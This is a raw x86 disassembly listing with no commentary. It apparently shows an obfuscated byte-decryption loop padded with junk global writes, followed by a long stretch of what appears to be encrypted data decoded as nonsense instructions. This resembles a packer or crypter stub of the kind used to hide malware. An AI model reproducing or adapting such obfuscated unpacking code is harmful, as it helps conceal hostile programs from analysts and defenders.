  4038bb:	lea    ecx,[eax+ecx*1+0x64e5de]
  4038c2:	and    DWORD PTR ds:0x42a3ba,0x0
  4038cc:	xor    eax,eax
  4038ce:	or     eax,DWORD PTR ds:0x42a3ba
  4038d4:	inc    eax
  4038d5:	mov    ds:0x42a3ba,eax
  4038da:	cmp    DWORD PTR ds:0x42a3ba,0x7
  4038e1:	jge    0x403927
  4038e7:	jmp    0x403902
  4038ec:	push   DWORD PTR [ebp-0x10]
  4038ef:	push   DWORD PTR [ebp-0x28]
  4038f2:	push   0x5cc9
  4038f7:	push   0x429181
  4038fc:	call   DWORD PTR ds:0x42a51a
  403902:	cmp    DWORD PTR ds:0x42a3ba,0x6
  403909:	jne    0x40391a
  40390f:	mov    eax,ds:0x42a3ba
  403914:	inc    eax
  403915:	mov    ds:0x42a3ba,eax
  40391a:	cmp    DWORD PTR ds:0x42a3ba,0x11
  403921:	jb     0x4038cc
  403927:	mov    eax,DWORD PTR [ebp-0xc]
  40392a:	sbb    DWORD PTR ds:0x42a416,0x42a446
  403934:	xor    edx,edx
  403936:	or     DWORD PTR ds:0x42a3ee,0x16dc
  403940:	div    ecx
  403942:	or     eax,ecx
  403944:	mov    eax,DWORD PTR [ebp-0x8]
  403947:	xor    ecx,ecx
  403949:	xor    ecx,DWORD PTR ds:0x42a3e2
  40394f:	sbb    DWORD PTR ds:0x42a44a,ecx
  403955:	mov    ecx,DWORD PTR [ebp-0x10]
  403958:	xor    eax,esi
  40395a:	or     DWORD PTR ds:0x42a412,0x42a3ea
  403964:	xor    ecx,esi
  403966:	sbb    DWORD PTR ds:0x42a40e,0x52cd
  403970:	sub    eax,ecx
  403972:	cmp    edx,eax
  403974:	jne    0x403b11
  40397a:	mov    eax,DWORD PTR [ebp-0xc]
  40397d:	neg    ecx
  40397f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  403986:	adc    ecx,eax
  403988:	mov    eax,DWORD PTR [ebp-0x28]
  40398b:	mov    ecx,DWORD PTR [ebp-0x18]
  40398e:	not    DWORD PTR ds:0x42a42a
  403994:	xor    eax,esi
  403996:	or     DWORD PTR ds:0x42a44a,0xa4f
  4039a0:	xor    ecx,esi
  4039a2:	or     DWORD PTR ds:0x42a3ba,0x42a446
  4039ac:	add    eax,edi
  4039ae:	add    ecx,edi
  4039b0:	mov    BYTE PTR [ebp-0x21],dl
  4039b3:	cmp    eax,ecx
  4039b5:	jae    0x403ac5
  4039bb:	add    edx,DWORD PTR ds:0x42a3f2
  4039c1:	lea    ecx,[eax-0x3272ef]
  4039c7:	mov    DWORD PTR [ebp-0x14],ecx
  4039ca:	sub    DWORD PTR ds:0x42a3ca,0x2374
  4039d4:	mov    edx,DWORD PTR [ebp-0x14]
  4039d7:	add    DWORD PTR ds:0x42a3f2,0x6412
  4039e1:	xor    edx,esi
  4039e3:	add    edx,0x7f55d8fb
  4039e9:	lea    ecx,[ebp+eax*4-0xb4]
  4039f0:	mov    DWORD PTR ds:0x42a3aa,0x798e
  4039fa:	mov    DWORD PTR [ecx],edx
  4039fc:	mov    edx,0x1097
  403a01:	mov    edx,DWORD PTR [ecx]
  403a03:	cmp    edx,0x244ecb9c
  403a09:	jbe    0x403a24
  403a0f:	xor    DWORD PTR ds:0x42a3ea,0x42a426
  403a19:	add    DWORD PTR [ecx],0x405fcdd
  403a1f:	jmp    0x403a2a
  403a24:	add    DWORD PTR [ecx],0xfdaf4323
  403a2a:	or     DWORD PTR ds:0x42a446,edi
  403a30:	mov    ecx,DWORD PTR [ebp-0x18]
  403a33:	xor    ecx,esi
  403a35:	and    DWORD PTR ds:0x42a3ae,0x42a3ca
  403a3f:	inc    eax
  403a40:	and    DWORD PTR ds:0x42a3fa,0x42a3f6
  403a4a:	inc    DWORD PTR [ebp-0x14]
  403a4d:	add    ecx,edi
  403a4f:	mov    DWORD PTR ds:0x42a446,0x14dc
  403a59:	cmp    eax,ecx
  403a5b:	mov    DWORD PTR ds:0x42a44e,0x33af
  403a65:	jb     0x4039ca
  403a6b:	and    DWORD PTR ds:0x42a3ae,0x0
  403a75:	mov    eax,ds:0x42a3ae
  403a7a:	inc    eax
  403a7b:	mov    ds:0x42a3ae,eax
  403a80:	cmp    DWORD PTR ds:0x42a3ae,0x1c
  403a87:	jge    0x403ac2
  403a8d:	jmp    0x403ab5
  403a92:	push   0x42a3de
  403a97:	push   0x8ee8
  403a9c:	push   DWORD PTR [ebp-0xc]
  403a9f:	push   0x2324
  403aa4:	push   0x4718
  403aa9:	push   DWORD PTR [ebp-0x20]
  403aac:	push   DWORD PTR [ebp-0x18]
  403aaf:	call   DWORD PTR ds:0x42a51e
  403ab5:	cmp    DWORD PTR ds:0x42a3ae,0x18
  403abc:	jb     0x403a75
  403ac2:	mov    dl,BYTE PTR [ebp-0x21]
  403ac5:	mov    eax,DWORD PTR [ebp-0x34]
  403ac8:	xor    DWORD PTR ds:0x42a402,0x7a5d
  403ad2:	xor    al,0xa8
  403ad4:	mov    cl,0x11
  403ad6:	sub    cl,al
  403ad8:	xor    DWORD PTR ds:0x42a422,0x74a5
  403ae2:	add    dl,cl
  403ae4:	or     DWORD PTR ds:0x42a3b6,edi
  403aea:	mov    ecx,DWORD PTR [ebp-0x1c]
  403aed:	xor    cl,0xa8
  403af0:	sub    cl,0x11
  403af3:	ror    dl,cl
  403af5:	sub    DWORD PTR ds:0x42a3ce,edi
  403afb:	xor    eax,eax
  403afd:	mov    eax,DWORD PTR [ebp-0xc]
  403b00:	sub    DWORD PTR ds:0x42a426,0x42a44a
  403b0a:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403b11:	adc    ecx,DWORD PTR ds:0x42a3e2
  403b17:	mov    eax,DWORD PTR [ebp-0xc]
  403b1a:	adc    DWORD PTR ds:0x42a416,ecx
  403b20:	mov    ecx,DWORD PTR [ebp-0x28]
  403b23:	sub    DWORD PTR ds:0x42a41e,0x42a442
  403b2d:	sub    eax,edi
  403b2f:	and    DWORD PTR ds:0x42a3aa,0x42a442
  403b39:	xor    eax,esi
  403b3b:	cmp    eax,ecx
  403b3d:	jne    0x403b67
  403b43:	mov    eax,DWORD PTR [ebp-0x8]
  403b46:	mov    ecx,DWORD PTR [ebp-0x10]
  403b49:	xor    eax,esi
  403b4b:	xor    ecx,esi
  403b4d:	sub    eax,ecx
  403b4f:	sub    eax,edi
  403b51:	xor    eax,esi
  403b53:	mov    DWORD PTR [ebp-0x8],eax
  403b56:	mov    eax,DWORD PTR [ebp-0x10]
  403b59:	xor    eax,esi
  403b5b:	mov    ecx,0xffcd8d91
  403b60:	sub    ecx,eax
  403b62:	jmp    0x403b76
  403b67:	mov    eax,DWORD PTR [ebp-0x10]
  403b6a:	xor    eax,esi
  403b6c:	mov    ecx,0xffcd8d11
  403b71:	sub    ecx,eax
  403b73:	add    ecx,DWORD PTR [ebp-0xc]
  403b76:	mov    DWORD PTR [ebp-0xc],ecx
  403b79:	mov    eax,DWORD PTR [ebp-0x8]
  403b7c:	cmp    eax,0xf89c85b9
  403b81:	jne    0x403897
  403b87:	jmp    0x405f2a
  403b8c:	cmc    
  403b8d:	cld    
  403b8e:	mov    ebx,0xb5fbbb03
  403b93:	test   BYTE PTR [eax+esi*1+0x66ec944a],dh
  403b9a:	jb     0x403bd5
  403b9c:	cld    
  403b9d:	pop    edi
  403b9e:	jp     0x403c1a
  403ba0:	cld    
  403ba1:	pop    edi
  403ba2:	jp     0x403c1e
  403ba4:	add    eax,0x8f5f9f32
  403ba9:	inc    ecx
  403baa:	imul   eax,DWORD PTR [esi+0x7e1223e4],0x1a
  403bb1:	cmp    eax,0xf71e6c3a
  403bb6:	xor    esp,esi
  403bb8:	js     0x403c02
  403bba:	(bad)  
  403bbb:	rol    DWORD PTR [eax-0x44977950],0xb6
  403bc2:	gs push ebx
  403bc4:	jecxz  0x403c3d
  403bc6:	add    BYTE PTR [eax+eiz*1],dl
  403bc9:	pusha  
  403bca:	mov    ch,0xdc
  403bcc:	xchg   ecx,eax
  403bcd:	dec    esi
  403bce:	add    DWORD PTR ds:0xd95cc872,0x2beee1c
  403bd8:	xchg   ebx,eax
  403bd9:	xchg   BYTE PTR [ecx+0x8],cl
  403bdc:	pop    esp
  403bdd:	out    0x1a,eax
  403bdf:	mov    bl,0xb7
  403be1:	in     al,0x30
  403be3:	scas   eax,DWORD PTR es:[edi]
  403be4:	jmp    0x7744a949
  403be9:	pop    ebp
  403bea:	dec    BYTE PTR [edx-0x18]
  403bed:	jae    0x403bc9
  403bef:	jne    0x403b9d
  403bf1:	jmp    0x403bea
  403bf3:	sub    edi,DWORD PTR [edx]
  403bf5:	dec    esi
  403bf6:	jmp    0x6611:0xb375bceb
  403bfd:	aas    
  403bfe:	mov    dh,0xf1
  403c00:	inc    eax
  403c01:	inc    ebp
  403c02:	ds inc edi
  403c04:	add    eax,0x5941f000
  403c09:	fbstp  TBYTE PTR [ebx]
  403c0b:	mov    ebx,0xf92f1ada
  403c10:	pop    ebx
  403c11:	pop    ebx
  403c12:	cmp    BYTE PTR [eax],ah
  403c14:	or     cl,BYTE PTR [ebp-0x5f]
  403c17:	xchg   ebp,eax
  403c18:	mov    bh,0x94
  403c1a:	or     eax,0xe9c303a0
  403c1f:	xchg   esi,eax
  403c20:	inc    ebp
  403c21:	push   ss
  403c22:	lods   eax,DWORD PTR ds:[esi]
  403c23:	fadd   st,st(1)
  403c25:	(bad)  
  403c26:	push   ebp
  403c27:	loope  0x403c3d
  403c29:	loopne 0x403c76
  403c2b:	es xchg ebx,eax
  403c2d:	enter  0x1ee3,0x27
  403c31:	or     DWORD PTR [edi+eiz*4-0x38dc40e6],ebx
  403c38:	adc    edx,DWORD PTR [eax-0x7d]
  403c3b:	pop    esi
  403c3c:	jecxz  0x403c1e
  403c3e:	sbb    ecx,DWORD PTR [eax]
  403c40:	stos   DWORD PTR es:[edi],eax
  403c41:	sar    edx,cl
  403c43:	leave  
  403c44:	xchg   ebp,eax
  403c45:	daa    
  403c46:	inc    ecx
  403c47:	ds push ecx
  403c49:	cmp    eax,0x7542c7d8
  403c4e:	adc    ebp,DWORD PTR [edx-0x1cdaf5cb]
  403c54:	xchg   DWORD PTR [edi],ebx
  403c56:	jo     0x403c7c
  403c58:	aam    0x78
  403c5a:	push   esi
  403c5b:	cwde   
  403c5c:	int    0x5b
  403c5e:	push   ecx
  403c5f:	je     0x403be9
  403c61:	sub    DWORD PTR [esi-0x3b],esp
  403c64:	push   ss
  403c65:	loopne 0x403cc9
  403c67:	das    
  403c68:	fs dec esi
  403c6a:	xor    eax,0xa6ba93f5
  403c6f:	or     eax,0xdfeaa0d3
  403c74:	mov    ds:0xa8db5d35,al
  403c79:	sbb    al,0x3b
  403c7b:	fistp  DWORD PTR [edi-0x3ef1e494]
  403c81:	mov    ecx,ss
  403c83:	stos   DWORD PTR es:[edi],eax
  403c84:	mov    ebx,0x9411a9e5
  403c89:	aas    
  403c8a:	test   BYTE PTR [edi+0x67],ch
  403c8d:	dec    ecx
  403c8e:	mov    eax,ds:0x5014941f
  403c93:	sub    al,0x9e
  403c95:	jbe    0x403cbe
  403c97:	cmp    esp,DWORD PTR [ebx]
  403c99:	loop   0x403c1c
  403c9b:	int    0x62
  403c9d:	test   DWORD PTR [ebx],esi
  403c9f:	inc    ebp
  403ca0:	lahf   
  403ca1:	call   0x5eea796c
  403ca6:	mov    edx,0x4c3aed32
  403cab:	push   ds
  403cac:	sbb    eax,0x20ec951d
  403cb1:	mov    ecx,0xa4cff640
  403cb6:	mov    esi,0x8b18c442
  403cbb:	xchg   ebx,eax
  403cbc:	ins    BYTE PTR es:[edi],dx
  403cbd:	pop    dx
  403cbf:	xchg   ecx,eax
  403cc0:	es or  al,0xd1
  403cc3:	jmp    0x403d02
  403cc5:	xor    DWORD PTR [edi],ebx
  403cc7:	pushf  
  403cc8:	push   cs
  403cc9:	jl     0x403cf5
  403ccb:	dec    edx
  403ccc:	xor    al,0xb7
  403cce:	push   ss
  403ccf:	lods   al,BYTE PTR gs:[esi]
  403cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cd2:	sar    bl,0xbf
  403cd5:	push   ebx
  403cd6:	test   DWORD PTR [esp+eiz*2],ebp
  403cd9:	xchg   BYTE PTR [ecx-0x641e9a4a],al
  403cdf:	je     0x403d4b
  403ce1:	imul   eax,DWORD PTR [ecx+0x49a7d3b0],0x4f
  403ce8:	add    ch,BYTE PTR [ecx]
  403cea:	jp     0x403ca0
  403cec:	mov    dh,0xcb
  403cee:	mov    esi,0x93941b4e
  403cf3:	sbb    eax,0xa8f315df
  403cf8:	mov    dl,0x25
  403cfa:	dec    edi
  403cfb:	popa   
  403cfc:	ret    0x9045
  403cff:	bound  ecx,QWORD PTR [ebp-0x5fd83af8]
  403d05:	pop    ss
  403d06:	mov    ebx,0x7b0caf72
  403d0b:	(bad)  
  403d0c:	shl    esp,cl
  403d0e:	dec    edx
  403d0f:	mov    edx,0x20913a16
  403d14:	ror    DWORD PTR [edi+0x61],0x45
  403d18:	dec    ebp
  403d19:	add    edx,ebx
  403d1b:	loope  0x403d12
  403d1d:	push   edi
  403d1e:	adc    eax,0x64b1f1c5
  403d23:	clc    
  403d24:	mov    eax,ds:0xd288f51c
  403d29:	bound  eax,QWORD PTR [edx+0x52]
  403d2c:	cmp    BYTE PTR [eax-0x50911c1e],0xa5
  403d33:	or     ah,bl
  403d35:	sti    
  403d36:	sbb    dl,al
  403d38:	sbb    esp,DWORD PTR [ecx-0x1eebcac1]
  403d3e:	push   0xb8a5db95
  403d43:	pop    ecx
  403d44:	pop    ss
  403d45:	outs   dx,DWORD PTR ds:[esi]
  403d46:	adc    ecx,DWORD PTR [edi-0x54]
  403d49:	mov    eax,0xbfd40a8d
  403d4e:	fmul   QWORD PTR [ebx-0x29]
  403d51:	push   0x3b
  403d53:	pusha  
  403d54:	repz out dx,eax
  403d56:	js     0x403cda
  403d58:	popf   
  403d59:	adc    eax,0x8b8ea7d1
  403d5e:	aas    
  403d5f:	(bad)  
  403d60:	pushf  
  403d61:	ror    DWORD PTR [ecx],cl
  403d63:	pop    eax
  403d64:	xchg   esp,eax
  403d65:	or     DWORD PTR [ecx-0x11],0x8
  403d69:	js     0x403d51
  403d6b:	stc    
  403d6c:	pushf  
  403d6d:	sub    esi,DWORD PTR [esi-0x10a2abfa]
  403d73:	fild   WORD PTR [edi]
  403d75:	nop
  403d76:	js     0x403d80
  403d78:	mov    esp,0x14043d7
  403d7d:	ins    BYTE PTR es:[edi],dx
  403d7e:	mov    WORD PTR [esi+ecx*1+0x52ca0139],cs
  403d85:	mov    ch,cl
  403d87:	(bad)  
  403d88:	jmp    0xbb519f64
  403d8d:	dec    ebp
  403d8e:	fwait
  403d8f:	cld    
  403d90:	fist   WORD PTR [edx-0x52]
  403d93:	jmp    0x403d84
  403d95:	icebp  
  403d96:	rcr    BYTE PTR [esi],cl
  403d98:	aaa    
  403d99:	jecxz  0x403e18
  403d9b:	xor    al,0x1e
  403d9d:	pop    edi
  403d9e:	fst    DWORD PTR [ecx]
  403da0:	rol    BYTE PTR [ecx-0x506ddffc],1
  403da6:	ret    0x8925
  403da9:	lea    ecx,[edi+0x2b59e7c1]
  403daf:	pushf  
  403db0:	fs pop ecx
  403db2:	push   esi
  403db3:	and    ah,BYTE PTR [ecx-0x41]
  403db6:	(bad)  
  403db7:	fadd   st,st(2)
  403db9:	shl    BYTE PTR [edi],0x31
  403dbc:	fs pop edi
  403dbe:	xor    bl,BYTE PTR ds:0x17efa8bb
  403dc4:	sub    dh,0xff
  403dc7:	pop    esi
  403dc8:	icebp  
  403dc9:	mov    ds:0xf1961556,al
  403dce:	xchg   BYTE PTR [eax],ch
  403dd0:	push   ebx
  403dd1:	mov    ebp,0xc6b03d52
  403dd6:	outs   dx,DWORD PTR ds:[esi]
  403dd7:	fnstenv [esp+edx*8-0x7d]
  403ddb:	xor    al,0x1d
  403ddd:	mov    cl,0xf
  403ddf:	push   eax
  403de0:	addr16 sbb bl,bl
  403de3:	mov    edx,0x660647b0
  403de8:	out    0x89,al
  403dea:	dec    esp
  403deb:	lea    eax,[edx+0x1e8b696f]
  403df1:	or     BYTE PTR [esi+edx*4+0x6c],cl
  403df5:	mov    al,ds:0x39f11b17
  403dfa:	mov    ds:0x2f87c434,eax
  403dff:	jmp    0x403e57
  403e01:	loope  0x403e3e
  403e03:	dec    ebx
  403e04:	jmp    0x88caca5c
  403e09:	pop    ebp
  403e0a:	or     esp,edi
  403e0c:	mov    esp,0xf31f72e3
  403e11:	adc    dl,BYTE PTR [ebp+0x751548bd]
  403e17:	add    BYTE PTR [ebx+0x78c59fed],ch
  403e1d:	stos   DWORD PTR es:[edi],eax
  403e1e:	call   0x7379:0xd29c946a
  403e25:	mov    ds:0xe8a05bc9,eax
  403e2a:	shl    BYTE PTR [ebx+ecx*4-0x8702a01],1
  403e31:	cwde   
  403e32:	sub    DWORD PTR [ecx-0x28df3737],0xdf917a96
  403e3c:	rcr    BYTE PTR [ebp-0x698d17e0],0x75
  403e43:	cmp    cl,BYTE PTR [ebx-0x6f]
  403e46:	je     0x403e12
  403e48:	std    
  403e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e4a:	sub    DWORD PTR [edx-0x2f],edi
  403e4d:	and    DWORD PTR [edi+esi*8+0x56],ecx
  403e51:	and    edx,0x5928e6d6
  403e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e58:	mov    fs,edx
  403e5a:	int3   
  403e5b:	test   eax,0x8c3fdf32
  403e60:	jb     0x403ea9
  403e62:	mov    esp,0xf6d2c196
  403e67:	mov    eax,0x6954105b
  403e6c:	adc    bl,ch
  403e6e:	mov    ebp,0xe8fde4f5
  403e73:	push   esi
  403e74:	dec    esp
  403e75:	imul   ebx,DWORD PTR [ebx-0x69d21cf1],0x4a
  403e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e7d:	push   es
  403e7e:	xlat   BYTE PTR ds:[ebx]
  403e7f:	icebp  
  403e80:	jns    0x403e4d
  403e82:	outs   dx,BYTE PTR ds:[esi]
  403e83:	pop    ds
  403e84:	jnp    0x403e64
  403e86:	dec    ebp
  403e87:	mov    bh,0x0
  403e89:	mov    ecx,0x4c3986e5
  403e8e:	sbb    al,0x47
  403e90:	mov    ebx,0x4cb7f0de
  403e95:	inc    esp
  403e96:	sbb    dh,BYTE PTR [eax-0x4e]
  403e99:	push   es
  403e9a:	sbb    ch,dh
  403e9c:	cmp    BYTE PTR [ebx-0x77],bh
  403e9f:	adc    bh,BYTE PTR [eax+0x770ccd5b]
  403ea5:	push   0xd
  403ea7:	cmp    BYTE PTR [ecx+eiz*2+0xe],bh
  403eab:	outs   dx,BYTE PTR ds:[esi]
  403eac:	pop    ecx
  403ead:	dec    esp
  403eae:	retf   
  403eaf:	or     dh,BYTE PTR [edi+0x70]
  403eb2:	sbb    DWORD PTR [edi-0x60653ae9],0x5c
  403eb9:	aas    
  403eba:	(bad)  
  403ebb:	jg     0x403eb9
  403ebd:	ins    BYTE PTR es:[edi],dx
  403ebe:	pop    ecx
  403ebf:	cmp    DWORD PTR [esi],esi
  403ec1:	mov    bh,0xb8
  403ec3:	mov    ecx,edi
  403ec5:	pop    es
  403ec6:	mov    edx,0x95848d57
  403ecb:	inc    eax
  403ecc:	sbb    cl,BYTE PTR [esi]
  403ece:	jl     0x403eb0
  403ed0:	sar    cl,1
  403ed2:	add    bh,BYTE PTR [ebp-0x4cf289dc]
  403ed8:	jp     0x403eb4
  403eda:	pop    esi
  403edb:	sbb    al,0x3b
  403edd:	repz scas al,BYTE PTR es:[edi]
  403edf:	and    BYTE PTR [eax],bh
  403ee1:	xchg   BYTE PTR [eax+0x33],bh
  403ee4:	popf   
  403ee5:	and    ecx,ecx
  403ee7:	xor    edx,DWORD PTR [ecx+ebp*2+0x5f]
  403eeb:	rcl    BYTE PTR [edx-0x16a08045],0xba
  403ef2:	jmp    0x403f17
  403ef4:	xlat   BYTE PTR ds:[ebx]
  403ef5:	lea    esi,[eax-0x7cd66542]
  403efb:	xor    DWORD PTR [ecx],edx
  403efd:	cmp    ch,BYTE PTR [ecx+0x1f7d6e9a]
  403f03:	repnz sbb eax,DWORD PTR [ebx+eax*4+0x14]
  403f08:	clc    
  403f09:	or     al,0xa1
  403f0b:	inc    esi
  403f0c:	xchg   ebx,eax
  403f0d:	(bad)  
  403f0e:	gs dec esi
  403f10:	shl    DWORD PTR [eax],cl
  403f12:	xchg   esi,eax
  403f13:	rcl    DWORD PTR [ebp+ebp*4+0x4e8078e],0xb
  403f1b:	arpl   WORD PTR [edx],di
  403f1d:	pop    ds
  403f1e:	sbb    eax,0x4a7b4803
  403f23:	push   esp
  403f24:	(bad)  [edi+0x25]
  403f27:	sbb    ebp,esp
  403f29:	dec    esp
  403f2a:	rol    BYTE PTR [ebx+0x70aef90b],1
  403f30:	mov    ah,dh
  403f32:	bound  esp,QWORD PTR [ecx]
  403f34:	aad    0x12
  403f36:	jmp    0x403ec9
  403f38:	sbb    dh,dl
  403f3a:	fstp   st(1)
  403f3c:	shld   DWORD PTR gs:[ebx-0x7b362a4],edi,cl
  403f44:	mov    ebp,0xb81dbaf2
  403f49:	mov    esi,ecx
  403f4b:	out    0x27,al
  403f4d:	jp     0x403f60
  403f4f:	in     al,dx
  403f50:	lea    esp,[ebp+0x43]
  403f53:	and    edx,ebx
  403f55:	bound  esp,QWORD PTR [ebx]
  403f57:	jmp    0xae098179
  403f5c:	aad    0xcf
  403f5e:	add    edi,DWORD PTR [ebx+0x2c]
  403f61:	aaa    
  403f62:	daa    
  403f63:	test   eax,0xff16164b
  403f68:	imul   edi,DWORD PTR [ecx+edi*2+0x66fa362c],0x486c18e8
  403f73:	jmp    DWORD PTR ds:0xe5ef8c31
  403f79:	adc    ebx,edi
  403f7b:	adc    ch,cl
  403f7d:	or     esi,esi
  403f7f:	jmp    0x403f10
  403f81:	and    ecx,DWORD PTR [ebp+0x15dc7db1]
  403f87:	mov    bh,0x99
  403f89:	ficomp WORD PTR [ecx]
  403f8b:	pop    ebp
  403f8c:	or     ebp,DWORD PTR [eax-0x22df1127]
  403f92:	hlt    
  403f93:	aas    
  403f94:	lea    edx,[esi-0x11]
  403f97:	outs   dx,BYTE PTR ds:[esi]
  403f98:	xor    eax,0xa8616f75
  403f9d:	sbb    eax,0xac6413c5
  403fa2:	jo     0x403fc3
  403fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa5:	outs   dx,DWORD PTR ds:[esi]
  403fa6:	hlt    
  403fa7:	ds inc ecx
  403fa9:	in     al,dx
  403faa:	lahf   
  403fab:	mov    bh,BYTE PTR [ecx]
  403fad:	cmp    al,BYTE PTR [ebx]
  403faf:	(bad)  
  403fb0:	enter  0xbf2e,0x74
  403fb4:	mov    dh,0x47
  403fb6:	loopne 0x40401f
  403fb8:	mov    edx,0x800d2352
  403fbd:	dec    edx
  403fbe:	inc    edi
  403fbf:	mov    cl,0xae
  403fc1:	(bad)  
  403fc2:	inc    BYTE PTR [eax-0x52]
  403fc5:	repz shr BYTE PTR [ebx-0x16],0x11
  403fca:	bnd call 0xe97e8d7a
  403fd0:	neg    BYTE PTR [ebp-0xbd90401]
  403fd6:	loopne 0x40402f
  403fd8:	cli    
  403fd9:	bound  edx,QWORD PTR [ebx+0xa596994]
  403fdf:	mov    ebx,0x7847eb9e
  403fe4:	dec    esi
  403fe5:	cmp    eax,0x47ca6e1f
  403fea:	sbb    bl,ch
  403fec:	sub    edx,esi
  403fee:	repz mov ch,0x9a
  403ff1:	adc    al,0x38
  403ff3:	sbb    DWORD PTR es:[edx],edx
  403ff6:	mov    al,0xf5
  403ff8:	inc    edi
  403ff9:	jecxz  0x40403f
  403ffb:	jg     0x403ff7
  403ffd:	inc    esi
  403ffe:	fsubr  DWORD PTR [edx]
  404000:	add    eax,0xb2b1cd77
  404005:	ins    DWORD PTR es:[edi],dx
  404006:	dec    ebx
  404007:	push   ss
  404008:	repnz or ebx,DWORD PTR [ebx-0xd32032]
  40400f:	pop    edi
  404010:	mov    dl,0xe2
  404012:	lods   eax,DWORD PTR ds:[esi]
  404013:	xchg   DWORD PTR [ecx-0x52],ecx
  404016:	xrelease mov DWORD PTR [esp+eiz*2],ebx
  40401a:	dec    ebp
  40401b:	paddq  mm0,QWORD PTR [edi]
  40401e:	cmp    cl,BYTE PTR [edx]
  404020:	jle    0x40405b
  404022:	and    edi,DWORD PTR [edx]
  404024:	out    dx,al
  404025:	dec    esp
  404026:	inc    ecx
  404027:	pusha  
  404028:	dec    ecx
  404029:	mov    ds:0x8dff2db9,al
  40402e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40402f:	jne    0x403fd5
  404031:	jmp    0xe4db:0x403fc27
  404038:	ret    
  404039:	add    DWORD PTR [ecx-0x64d06ef4],eax
  40403f:	clc    
  404040:	sahf   
  404041:	retf   0xf5f6
  404044:	iret   
  404045:	mov    ch,0x7a
  404047:	jmp    DWORD PTR [ebx-0x564b62d9]
  40404d:	ja     0x4040b7
  40404f:	mov    ch,0x61
  404051:	aaa    
  404052:	js     0x40407f
  404054:	xchg   edi,eax
  404055:	shr    BYTE PTR [edx],1
  404057:	xlat   BYTE PTR ds:[ebx]
  404058:	data16 std 
  40405a:	and    ah,bh
  40405c:	jl     0x40400b
  40405e:	push   0xe1769f95
  404063:	sbb    BYTE PTR [ecx],cl
  404065:	adc    al,0xc1
  404067:	push   ecx
  404068:	pusha  
  404069:	pop    eax
  40406a:	mov    al,ds:0xca73855e
  40406f:	loope  0x40400e
  404071:	ja     0x40401e
  404073:	jno    0x404072
  404075:	pushf  
  404076:	dec    esi
  404077:	add    bl,ch
  404079:	fs dec ebx
  40407b:	int3   
  40407c:	xchg   edi,eax
  40407d:	mov    WORD PTR [ebx],?
  40407f:	and    DWORD PTR [ebp+0x46134e47],edx
  404085:	in     eax,0x2a
  404087:	xor    bl,al
  404089:	pop    ds
  40408a:	sbb    esp,DWORD PTR [eax]
  40408c:	xchg   eax,ebx
  40408e:	mov    bh,0xd4
  404090:	xchg   edi,eax
  404091:	iret   
  404092:	repnz cmp edi,DWORD PTR [eax-0x32b936c6]
  404099:	xchg   edx,eax
  40409a:	pop    ebp
  40409b:	adc    eax,0xd74020db
  4040a0:	fstp   TBYTE PTR [ecx+edx*4+0x3f]
  4040a4:	mov    WORD PTR [ebp+0x3c],cs
  4040a7:	rcl    BYTE PTR [esi-0x1],0xb
  4040ab:	push   cs
  4040ac:	or     dl,BYTE PTR ds:0xeb61950c
  4040b2:	test   eax,0x468c7d4d
  4040b7:	sbb    edx,DWORD PTR [eax-0x7a]
  4040ba:	outs   dx,DWORD PTR ss:[esi]
  4040bc:	cmc    
  4040bd:	push   edi
  4040be:	mov    bl,0x48
  4040c0:	mov    eax,ds:0x55af0692
  4040c5:	mov    eax,ds:0xd36b07cf
  4040ca:	stos   DWORD PTR es:[edi],eax
  4040cb:	pop    ebp
  4040cc:	cmp    al,0xf5
  4040ce:	adc    ch,BYTE PTR [ebp-0x538d315c]
  4040d4:	and    ch,BYTE PTR [eax-0xb89c0b6]
  4040da:	test   BYTE PTR [ebx+0x768b7810],0xa2
  4040e1:	mov    esi,0xd9454a94
  4040e6:	inc    edi
  4040e7:	stos   BYTE PTR es:[edi],al
  4040e8:	mov    ds:0xf780645f,eax
  4040ed:	pop    ebx
  4040ee:	or     ecx,DWORD PTR [ebx+0x16]
  4040f1:	aam    0xe7
  4040f3:	mov    edx,DWORD PTR [edx+edx*4-0x28]
  4040f7:	add    BYTE PTR [edi-0x602038c5],cl
  4040fd:	inc    ebx
  4040fe:	add    edx,DWORD PTR [edi]
  404100:	shl    BYTE PTR [edi],0xb8
  404103:	or     ch,BYTE PTR [esi-0x77]
  404106:	popf   
  404107:	gs pop esi
  404109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40410a:	scas   al,BYTE PTR es:[edi]
  40410b:	mov    gs,WORD PTR [ecx+0x1edb9e1b]
  404111:	in     eax,dx
  404112:	enter  0x36ce,0xe8
  404116:	aas    
  404117:	into   
  404118:	or     DWORD PTR [esp+ebx*4],eax
  40411b:	xor    BYTE PTR [eax],al
  40411d:	mov    bh,0x12
  40411f:	int3   
  404120:	mov    bl,0x29
  404122:	push   ds
  404123:	add    ch,bh
  404125:	pop    ss
  404126:	jmp    0x404141
  404128:	out    dx,eax
  404129:	lods   al,BYTE PTR ds:[esi]
  40412a:	dec    edx
  40412b:	mov    eax,ds:0x1a5b15eb
  404130:	dec    edx
  404131:	call   0xb8ad:0xb0cd1842
  404138:	dec    ecx
  40413a:	addr16 cli 
  40413c:	push   ss
  40413d:	test   esp,ebx
  40413f:	xor    edx,DWORD PTR [edx-0x7b]
  404142:	data16 int 0x11
  404145:	es adc al,0x1c
  404148:	add    esi,DWORD PTR [ecx-0x39]
  40414b:	jl     0x4041b9
  40414d:	addr16 std 
  40414f:	aas    
  404150:	push   ss
  404151:	add    DWORD PTR [edi+eax*4],ebp
  404154:	sub    BYTE PTR [eax],0xc9
  404157:	xchg   BYTE PTR [ebx+0x2a],dl
  40415a:	sub    edx,esi
  40415c:	push   esi
  40415d:	jo     0x4041bb
  40415f:	adc    ebp,DWORD PTR [esi-0x251f8689]
  404165:	std    
  404166:	inc    ebp
  404167:	jge    0x40412f
  404169:	pop    ebx
  40416a:	xlat   BYTE PTR ds:[ebx]
  40416b:	test   eax,0x3171cbed
  404170:	mov    eax,0x2219ee83
  404175:	ss in  al,dx
  404177:	test   eax,0x441dae77
  40417c:	push   es
  40417d:	push   es
  40417e:	les    eax,FWORD PTR [ebx+0x29]
  404181:	pop    edi
  404182:	sar    al,1
